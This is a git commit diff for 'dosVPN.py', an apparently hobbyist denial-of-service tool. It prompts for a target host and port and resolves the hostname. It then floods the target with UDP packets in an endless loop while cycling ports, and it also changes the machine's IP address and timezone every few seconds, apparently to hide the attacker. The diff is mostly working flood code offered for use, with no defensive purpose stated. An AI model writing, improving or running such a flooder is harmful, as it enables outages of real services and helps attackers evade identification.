c7ae2201164951032e0d3b84ad63755a7f50c171
W r e n c h <134978254+Jeanpseven@users.noreply.github.com>
2023-10-22 13:03:00 -0300

    Update dosVPN.py

--- dosVPN.py
+++ dosVPN.py
@@ -36,34 +36,49 @@ print("github   : https://github.com/Jeanpseven")
 print("[+] https://github.com/Jeanpseven/Dr4xVPN activated")
 print()
 
-# Solicitar o alvo (pode ser um IP ou URL)
-target = input("IP Target or URL: ")
-port = int(input("Port       : "))
-
-os.system("clear")
-os.system("figlet Cyber Bombing Started")
-
-sent = 0
 while True:
-     sock.sendto(bytes, (target, port))
-     sent = sent + 1
-     port = port + 1
-     print("Sent %s packet to %s throught port:%s" % (sent, target, port))
-     if port == 65534:
-       port = 1
+    target = input("IP Target or URL: ")
+    port = int(input("Port       : "))
 
-# Loop para alterar o IP e o fuso horário a cada 5 segundos
-while True:
-    new_ip = generate_random_ip()
-    new_timezone = choose_random_timezone()
+    os.system("clear")
+    os.system("figlet Cyber Bombing Started")
 
-    # Alterar o IP
-    subprocess.run(["ifconfig", "eth0", new_ip])
+    sent = 0
+    success = False
+    variations = [target, "www." + target, "http://" + target, "https://" + target]
 
-    # Alterar o fuso horário
-    subprocess.run(["timedatectl", "set-timezone", new_timezone])
+    for variation in variations:
+        try:
+            target = socket.gethostbyname(variation)
+            success = True
+            break
+        except socket.gaierror:
+            print(f"Erro de resolução de nome de host para a variação: {variation}")
+            continue
 
-    print(f"IP alterado para {new_ip}, Fuso horário alterado para {new_timezone}")
+    if success:
+        while True:
+            sock.sendto(bytes, (target, port))
+            sent = sent + 1
+            port = port + 1
+            print("Sent %s packet to %s through port:%s" % (sent, target, port))
+            if port == 65534:
+                port = 1
+    else:
+        print("Não foi possível resolver o nome de host. Verifique sua conexão à internet e o nome de host.")
 
-    # Aguarde 5 segundos antes da próxima alteração
-    time.sleep(5)
+    # Loop para alterar o IP e o fuso horário a cada 5 segundos
+    while True:
+        new_ip = generate_random_ip()
+        new_timezone = choose_random_timezone()
+
+        # Alterar o IP
+        subprocess.run(["ifconfig", "eth0", new_ip])
+
+        # Alterar o fuso horário
+        subprocess.run(["timedatectl", "set-timezone", new_timezone])
+
+        print(f"IP alterado para {new_ip}, Fuso horário alterado para {new_timezone}")
+
+        # Aguarde 5 segundos antes da próxima alteração
+        time.sleep(5)
